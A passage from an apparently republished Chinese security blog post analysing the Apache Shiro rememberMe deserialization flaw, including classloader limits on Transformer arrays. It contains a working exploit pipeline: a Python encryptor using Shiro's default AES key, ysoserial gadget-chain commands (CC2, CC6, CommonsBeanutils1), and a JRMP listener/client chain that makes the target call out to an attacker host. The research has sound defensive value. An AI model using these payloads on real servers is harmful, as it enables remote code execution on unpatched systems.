> 原文链接: https://www.anquanke.com//post/id/249604 


# 关于Shiro反序列化漏洞的一些思考


                                阅读量   
                                **20873**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p2.ssl.qhimg.com/t011b9724d34b219ddd.jpg)](https://p2.ssl.qhimg.com/t011b9724d34b219ddd.jpg)



Shiro反序列化虽然被很多大佬们在前几年的学习中都总结的差不多了，但有些知识的总结思考还不是很具体。本文主要以抛出问题的方式，努力寻找在实际调试过程中遇到问题的真实答案，最后结合前辈们总结的知识点也用实践检验了知识点，特此记录。



## 0x01 漏洞简介

### <a class="reference-link" name="0x1%20%E4%BB%8B%E7%BB%8D"></a>0x1 介绍

Shiro是一个强大而灵活的开源安全框架，它非常简单的处理身份认证，其中提供了登录时的RememberMe功能，让用户在浏览器关闭重新打开后依然能恢复之前的会话。

此次分析的漏洞是一个标准的反序列化漏洞，其原理是Cookie中的rememberMe字段使用AES加密及Base64编码的方式储存用户身份信息，因此我们只要能够伪造Cookie并且让服务器正确的解密后反序列化任意对象，就可以造成一定的危害。

其实Shiro反序列化的漏洞触发和加解密分析都是比较简单的部分，最难的地方在于反序列化利用的部分，**坑点全在这里**。

### <a class="reference-link" name="0x2%20%E6%BC%8F%E6%B4%9E%E9%80%82%E7%94%A8%E7%89%88%E6%9C%AC"></a>0x2 漏洞适用版本

1.2.4版本及以下，整体流程是Base64解码—&gt;AES解密—&gt;反序列化。

我们从环境搭建开始一步步了解并掌握其中的知识。



## 0x02 环境搭建

### <a class="reference-link" name="0x1%20docker%20%E5%AE%B9%E5%99%A8%E4%B8%8B%E8%BD%BD"></a>0x1 docker 容器下载

```
docker run -d -p 8080:8080 -p 5006:5006 medicean/vulapps:s_shiro_1
```

直接使用docker构建相关研究环境，该环境没有配置调试选项，需要自己手动开启调试。

### <a class="reference-link" name="0x2%20%E5%BC%80%E5%90%AF%E8%B0%83%E8%AF%95"></a>0x2 开启调试

在docker中的catalina.sh里添加调试信息

```
vi /usr/local/tomcat/bin/catalina.sh
```

[![](https://p0.ssl.qhimg.com/t0130671b197fb827a5.png)](https://p0.ssl.qhimg.com/t0130671b197fb827a5.png)

服务端监听5006端口，等待接受来自客户端的调试数据。



## 0x03 漏洞分析

该漏洞是一个标准的反序列化漏洞，只不过在反序列化之前进行了加解密操作，使得步骤相对复杂了一些。为了加快分析速度，本文采用关键点分析法，重点分析如何识别加密算法、反序列化触发点、反序列化利用。在这之前首先分析该框架如何进行路由处理的。

### <a class="reference-link" name="0x0%20%E8%B7%AF%E7%94%B1%E5%A4%84%E7%90%86"></a>0x0 路由处理

Shiro在搭建服务的时候选择的Tomcat 标准架构，我们重点分析web.xml中的相关配置，我们从配置文件中看出，不论访问什么路由都会匹配到**ShiroFilter**这个拦截器进行处理。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01902bf7c16d0e7239.png)

然而这次漏洞出现的位置恰巧就在这个Filter中，不断跟进找到了一处关于Remember身份认证的调用，如下图所示。

[![](https://p3.ssl.qhimg.com/t01add86a99ea90d3ad.png)](https://p3.ssl.qhimg.com/t01add86a99ea90d3ad.png)

可以粗略的猜测关于rememberMe的处理就在这个函数中，关于路由分析部分就先讲到这里。关于怎么构造数据包，我采用的是在登陆界面选中Remember Me选项，从BurpSuite 或是浏览器中获取数据包。

[![](https://p4.ssl.qhimg.com/t015fa06d7b425e6931.png)](https://p4.ssl.qhimg.com/t015fa06d7b425e6931.png)

### <a class="reference-link" name="0x1%20%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"></a>0x1 识别加密算法

从上面分析到的resolvePrincipals函数继续向下分析，整个调用链如下

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t019e84e3a55c3d1d4d.png)

通过分析上图可以很清晰的看到decrypt和deserialize函数在同一个函数中进行调用。我们首先重点分析使用的什么算法进行加解密。直接将代码定位到convertBytesToPrincipals函数，该函数如下图所示。

[![](https://p2.ssl.qhimg.com/t01aa25a8072e769c4b.png)](https://p2.ssl.qhimg.com/t01aa25a8072e769c4b.png)

通过动态调试的方式跟进decrypt函数，看一看其中发生了什么事。在decrypt函数中发现了**加密套件**，该加密算法采用AES CBC模式并且采用PKCS5Padding模式进行填充。

[![](https://p0.ssl.qhimg.com/t018796c6f4ca81191a.png)](https://p0.ssl.qhimg.com/t018796c6f4ca81191a.png)

那么关于该算法这里不做过多的讲解，我们只需要知道该算法在加解密的时候需要知道**加解密密钥**以及**初始化向量**，接下来就要分析如何得到这两个重要的变量。

首先是**加解密密钥**，其实在上面截图中就能看到this.getDecryptionCipherKey函数是获取密钥的函数，跟进发现返回一个变量，该变量通过setCipherService函数进行赋值。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0154d00bfaadc2b83c.png)

[![](https://p1.ssl.qhimg.com/t01e8d3946e7f051597.png)](https://p1.ssl.qhimg.com/t01e8d3946e7f051597.png)

[![](https://p3.ssl.qhimg.com/t019b12c8415835cf3a.png)](https://p3.ssl.qhimg.com/t019b12c8415835cf3a.png)

上面三个函数调用为了给加解密密钥赋值，那么这个加解密密钥到底是什么，在低版本中这个base64编码就是我们想要的答案。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016ebda2dd0d505397.png)

继续分析**初始化向量**，cipherService.decrypt函数会初始化iv变量，通过调试发现，初始化向量的值为0，之后会在密文中取出前16个字节当作iv，因此iv值和密文我们可以控制。

[![](https://p0.ssl.qhimg.com/t0163490ad7c1e3cfbb.png)](https://p0.ssl.qhimg.com/t0163490ad7c1e3cfbb.png)

那么到这里其实可以写出加密脚本了

```
import sys
import base64
import uuid
from random import Random
import subprocess
from Crypto.Cipher import AES

key  =  "kPH+bIxk5D2deZiIxcaaaA=="
mode =  AES.MODE_CBC
IV   = ('0'*16).encode("utf8")
encryptor = AES.new(base64.b64decode(key), mode, IV)

payload=base64.b64decode(sys.argv[1])
BS   = AES.block_size
pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
payload=pad(payload)

print(base64.b64encode(IV + encryptor.encrypt(payload)))
```

### <a class="reference-link" name="0x2%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E7%82%B9"></a>0x2 反序列化触发点

反序列化的点在AES解密代码之后，红线部分为反序列化的最原始函数。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01e56048fe2840bd24.png)

继续跟进该函数，可在第二层deserialize函数处发现readObject函数的调用。

[![](https://p3.ssl.qhimg.com/t012a9670531cdccc06.png)](https://p3.ssl.qhimg.com/t012a9670531cdccc06.png)

​

## 0x04 问题剖析

之前公开资料中关于这个洞最大的争议就在 commons-collections3序列化链中的Transfomer数组加载不成功到底是什么原因造成的。从宏观的角度讲，在shiro利用方面可以简单的把反序列化利用链分为**带数组型**和**无数组型**两种情况。<br>
根据这个分类又细分了以下几个类型
<li>
**无数组型**commons-collections4</li>
<li>
**无数组型**commons-collections3</li>
<li>
**有数组型**commons-collections3</li>
<li>
**无数组型**commons-beanutils</li>
说到底shiro反序列化之所以这么折腾，是因为他自己重写了resolveClass函数，在反序列化的时候我们实际调用的是ClassUtils.forName

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t019bd9394a0e1b8583.png)

下面的是正常ObjectInputStream的resolveClass代码实现，可以看到使用了Class.forName进行类的加载操作

[![](https://p1.ssl.qhimg.com/t01b95e4519baeb8566.png)](https://p1.ssl.qhimg.com/t01b95e4519baeb8566.png)

回过头看看shiro自己实现的forName都干了什么事，这个ClassUtils其实就是shrio自己实现的类解析，其中调用了各种Classloader的loadClass方法进行加载。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t014628d29154f6c650.png)

在具体分析之前我们首先了解一些前置知识，Class.forName和Classloader.loadClass到底有什么区别以及共同之处？

### <a class="reference-link" name="0x0%20%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"></a>0x0 前置知识
- Class.forName不支持原生类型，但其他类型都是支持的
- Class.loadClass不能加载原生类型和数组类型，其他类型都是支持的
- 类加载和当前调用类的Classloader有关
这里的原生类型指的是byte、short、int、long、float、double、char、boolean。需要特别注意的是Class.loadClass**不支持加载数组类型**。

关于共同之处简单的讲这两个类加载都是基于ClassLoader进行的，关于ClassLoader将会单独写一篇文章进行学习，这里只需要记住ClassLoader制定了类搜索路径，这就意味着如果ClassLoader不对那么将永远不会加载出需要的类。

比较巧的是shiro在反序列化的时候使用了tomcat自己实现的WebappClassLoader，这个ClassLoader里面既有loadclass又有forName方法，因此出现了一些奇奇怪怪的**类加载灵异事件**。

[![](https://p5.ssl.qhimg.com/t015dfc9b10be7f3de2.png)](https://p5.ssl.qhimg.com/t015dfc9b10be7f3de2.png)

上面是ClassUtils::forName在加载类的时候会调用执行的代码，我们下面通过分析几个问题，理解并运用一开始提出的三个前置知识。

### <a class="reference-link" name="0x1%20%E9%97%AE%E9%A2%98%E4%B8%80%20%E9%83%A8%E5%88%86shiro%E7%9B%AE%E6%A0%87%E4%B8%8D%E8%83%BD%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Transformer%E6%95%B0%E7%BB%84"></a>0x1 问题一 部分shiro目标不能反序列化Transformer数组

是真的不能反序列化数组吗？还是只是不能反序列化Transformer数组？如果是那么为什么可以反序列化Transformer却不能反序列化Transformer数组呢？

疯狂三连问，我们在本小节一一解答。首先shiro是可以反序列化数组的，我们参照 [https://xz.aliyun.com/t/7950#toc-4](https://xz.aliyun.com/t/7950#toc-4) 中提到的数组类型，编写代码并构造了StackTraceElement数组，相关代码如下。

```
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

public class Test `{`
    public static byte[] serialize(final Object obj) throws Exception `{`
        ByteArrayOutputStream btout = new ByteArrayOutputStream();
        ObjectOutputStream objOut = new ObjectOutputStream(btout);
        objOut.writeObject(obj);
        return btout.toByteArray();
    `}`
    public static void main(String[] args) throws Exception `{`
        Object[] xx = new StackTraceElement[]`{`new StackTraceElement("1","2","2",1)`}`;
        System.out.println(Base64.getEncoder().encodeToString(serialize(xx)));
    `}`
`}`
```

看下shiro是怎么把这个数组反序列化的，从结果看Class.forName就能做到，因为StackTraceElement存在于rt.jar中，由BootStrapClassLoader加载，所以其classloader为null。

[![](https://p4.ssl.qhimg.com/t01a2227012c42a8bfa.png)](https://p4.ssl.qhimg.com/t01a2227012c42a8bfa.png)

这么看来shiro中还是可以反序列化数组的，只不过不能反序列化WEB-INFO/lib中的类。因为那里面的类加载使用的classloader。那么这就回答了前两个问题，shiro只是不能反序列化Transformer数组。

要回答第三个问题需要跟进一层，一开始对name进行了转化，规则简单描述为将.替换为/并且在最后面添加.class后缀

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bd8ce4cbeffebedf.png)

如图所示的path已经变形了，在resourceEntries中寻找path这个值恐怕是找不到的。

### <a class="reference-link" name="0x2%20%E9%97%AE%E9%A2%98%E4%BA%8C%20%E4%B8%8D%E5%90%8C%E6%97%B6%E6%9C%9F%E7%9A%84forName%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C%E4%B8%8D%E4%B8%80%E8%87%B4"></a>0x2 问题二 不同时期的forName函数执行结果不一致

学习大佬博客的时候有几个大佬指出了一个比较有意思的现象。在代码运行的不同时期去执行forName方法会的其结果有很大的差别。具体表现为在ClassUtils的loadClass方法中执行Class.forName(fqcn)可以获取到Transformer数组。

[![](https://p0.ssl.qhimg.com/t0197cfc3eeee6fe841.png)](https://p0.ssl.qhimg.com/t0197cfc3eeee6fe841.png)

然而在跟进一层之后到WebappClassLoaderBase的loadClass方法中就不能加载Transformer数组了。这个现象的背后其实是classloader在作怪，我们细细的看一下Class.forName中实现逻辑

[![](https://p2.ssl.qhimg.com/t016e785fcf97d4eec9.png)](https://p2.ssl.qhimg.com/t016e785fcf97d4eec9.png)

Reflection.getCallerClass可以得到调用者的类，那么根据这个逻辑我们在执行Class.forName函数时的Classloader就可以利用代码执行出来。

比如在WebappClassLoaderBase中执行Class.forName时的ClassLoader为URLCLassLoader，这里面以及他的父类是没有Transformer代码的，因此无法加载该类型数组。

[![](https://p4.ssl.qhimg.com/t01dbe16b31f11c73de.png)](https://p4.ssl.qhimg.com/t01dbe16b31f11c73de.png)

在进入该代码之前，也就是ClassUtils的loadClass方法中查看forName的ClassLoader，可以从下面的调试信息中看到该ClassLoader为webappClassLoader，里面都是WEB-INF/lib下面的jar包，因此可以反序列化Transformer数组。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0112ae587acf8afb37.png)



## 0x05 反序列化利用

了解了在shiro反序列化漏洞利用时的一些坑之后我们逐一对以下四种利用方式进行详细的分析。

根据这个分类又细分了以下几个类型
<li>
**无数组型**commons-collections4</li>
<li>
**无数组型**commons-collections3</li>
<li>
**有数组型**commons-collections3</li>
<li>
**无数组型**commons-beanutils</li>
<li>
**无数组型**JRMP</li>
这四种类型是针对目标上部署了不同种类和版本的依赖库进行的利用。在这四种利用方式中，第二种无数组型CC3是当时[wh1t3p1g](https://www.anquanke.com/member/144709)师傅把CC2和CC6两条链拼接在了一起。因此在分析shiro利用链的同时将之前分析的cc链的利用方式也顺便回顾下。打算以后开个专题专门分析Java反序列化利用链的挖掘以及构造方式，先挖个坑。这里ysoserial中的反序列化链就不展开讲了，有疑惑的小伙伴可以看看之前写的专题。

### <a class="reference-link" name="0x1%20%E6%97%A0%E6%95%B0%E7%BB%84%E5%9E%8Bcommons-collections4%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x1 无数组型commons-collections4利用链

**使用场景**<br>
因为shiro本身是无法反序列化在WEB-INF/lib依赖库中数组类型的，因此如果出现shiro服务上部署了commons-collections4依赖库，我们就可以使用ysoserial中的CC2进行攻击。

[![](https://p5.ssl.qhimg.com/t010ad7d6c40a132bd4.png)](https://p5.ssl.qhimg.com/t010ad7d6c40a132bd4.png)

使用方式如下

```
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections2 "touch /tmp/xxxx"  &gt; /tmp/1.txt
cat /tmp/1.txt|base64
python3 crypt1.py base64Content
```

[![](https://p1.ssl.qhimg.com/t01462bf723d60d9f03.png)](https://p1.ssl.qhimg.com/t01462bf723d60d9f03.png)

### <a class="reference-link" name="0x2%20%E6%97%A0%E6%95%B0%E7%BB%84%E5%9E%8Bcommons-collections3%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x2 无数组型commons-collections3利用链

**使用场景**<br>
这种情况适用于shiro上只有commons-collections3依赖库，并且该库存在于WEB-INF/lib中。

我们能否将ysoserial上的反序列化利用链按照它的要求改一改呢？那么我们首先要确定的是寻找无数组型的命令执行。碰巧的是在ysoserial工具中存在templatesImpl，利用字节码加载利用代码。

关于反序列化链的组合其实有很多种，其难点在于最终的调用链和封装链在逻辑上有很大的差异。我们最终要实现无数组反序列化利用链，有个简单的思路，使用templatesImpl命令执行，那么最后就要执行templatesImpl对象的newTransformer方法。反观整个ysoserial CC系列利用链，我们**可以进行任意对象方法调用**的梳理了下，总共有以下几种方式
<li>通过Transformer数组链式调用构造好参数的InvokerTransformer利用链，**特点是无需动态传递参数**
</li>
<li>使用TransformingComparator执行transform方法，**需要构造参数传递链**
</li>
<li>TiedMapEntry向LazyMap传递可控参数key，并调用LazyMap中的transform方法，**需要构造参数传递链**
</li>
简单分析这几个方式，第一种利用了Transformer数组，不太适合shiro的反序列化利用场景；第二种是commons-collections4的利用特性，在commons-collections3中TransformingComparator不可序列化；那么第三种就比较满足我们的需求了，可以通过一次transform调用执行传递过来key对象的任意方法。

为了方便构造，直接使用之前分析的CC链时的代码进行拼接，主要代码逻辑如下

```
final Object templates = createTemplatesImpl("touch /tmp/asdf");
final Transformer transformerChain = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
final Map innerMap = new HashMap();
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);
```

使用TiedMapEntry在构造方法中的key参数向lazyMap的get方法传递，之后再向transformerChain的transform方法传递，最后实现调用templates对象的newTransformer方法。

TiedMapEntry的构造方法如下，在执行toString方法的时候触发getValue方法，间接调用map.get(this.key)

[![](https://p0.ssl.qhimg.com/t014130bf8e0f92ce40.png)](https://p0.ssl.qhimg.com/t014130bf8e0f92ce40.png)

LazyMap的相关调用如下，成功将key传向transformerChain

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0150bb3372321e1ebb.png)

最后的反序列化执行流如下，但这并不意味着构造流程，在构造的时候我们更多关注的是不同类之间的依赖关系。

[![](https://p1.ssl.qhimg.com/t01b4963bbd93885877.png)](https://p1.ssl.qhimg.com/t01b4963bbd93885877.png)

完整代码链接 [https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/shiro_CC5_2](https://github.com/BabyTeam1024/ysoserial_analyse/blob/main/shiro_CC5_2)

### <a class="reference-link" name="0x3%20%E6%9C%89%E6%95%B0%E7%BB%84%E5%9E%8Bcommons-collections3%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x3 有数组型commons-collections3利用链

**使用场景**<br>
在shiro服务器上的tomcat lib目录中部署了commons-collections3.jar，如下图所示

[![](https://p5.ssl.qhimg.com/t01395e52fb485d8f7d.png)](https://p5.ssl.qhimg.com/t01395e52fb485d8f7d.png)

使用方式如下

```
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsCollections6 "touch /tmp/xxxx"  &gt; /tmp/1.txt
cat /tmp/1.txt|base64
python3 crypt1.py base64Content
```

[![](https://p4.ssl.qhimg.com/t01d1fd9f2424b4309c.png)](https://p4.ssl.qhimg.com/t01d1fd9f2424b4309c.png)

在复现有数组利用链的时候有个坑，因为服务使用的JDK为1.8，所以在使用cc链的时候要注意，不要采用在JDK1.7下才可用的利用链。

### <a class="reference-link" name="0x4%20%E6%97%A0%E6%95%B0%E7%BB%84%E5%9E%8Bcommons-beanutils%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x4 无数组型commons-beanutils利用链

**使用场景**<br>
这种情况适用于shiro上拥有commons-beanutils依赖库，并且该库存在于WEB-INF/lib中。

[![](https://p5.ssl.qhimg.com/t012aaf3b8a4a1cc4cd.png)](https://p5.ssl.qhimg.com/t012aaf3b8a4a1cc4cd.png)

使用方式如下

```
java -jar ysoserial-0.0.6-SNAPSHOT-BETA-all.jar CommonsBeanutils1 "touch /tmp/xasdf"  &gt; /tmp/1.txt
cat /tmp/1.txt|base64
python3 crypt1.py base64Content
```

[![](https://p0.ssl.qhimg.com/t011d956869a30acb4b.png)](https://p0.ssl.qhimg.com/t011d956869a30acb4b.png)

### <a class="reference-link" name="0x5%20%E6%97%A0%E6%95%B0%E7%BB%84%E5%9E%8BJRMP%E5%88%A9%E7%94%A8%E9%93%BE"></a>0x5 无数组型JRMP利用链

**使用场景**<br>
目标可以出网，不需要任何依赖

本地先用ysoserial起一个JRMPListener：

```
java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 'touch /tmp/xsdfa'
```

再执行

```
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPClient "192.168.0.102:1099" &gt; /tmp/1.txt
cat /tmp/1.txt|base64
python3 crypt1.py base64Content
```

[![](https://p3.ssl.qhimg.com/t011d2a4e0fbb81589d.png)](https://p3.ssl.qhimg.com/t011d2a4e0fbb81589d.png)

crypt1.py 脚本链接 [https://github.com/BabyTeam1024/shiro_vul](https://github.com/BabyTeam1024/shiro_vul)



## 0x06 总结

从shiro 反序列化中学习到了classloader在加载类的时候的一些知识，打算有时间单独学习总结下，在这次学习过程中又再一次感受到了反序列化的艺术魅力，文笔粗糙，有啥知识点描述不对的地方还请大家指正。



## 0x07 参考文献

[https://blog.zsxsoft.com/post/35](https://blog.zsxsoft.com/post/35)<br>[https://xz.aliyun.com/t/7950](https://xz.aliyun.com/t/7950#toc-3)<br>[https://www.faiz2035.top/posts/shiro-550-simple-analysis-2/](https://www.faiz2035.top/posts/shiro-550-simple-analysis-2/)<br>[https://www.anquanke.com/post/id/192619](https://www.anquanke.com/post/id/192619)<br>[https://juejin.cn/post/6844904114543919111](https://juejin.cn/post/6844904114543919111)<br>[https://www.zhihu.com/question/46719811](https://www.zhihu.com/question/46719811)<br>[https://buaq.net/go-38939.html](https://buaq.net/go-38939.html)
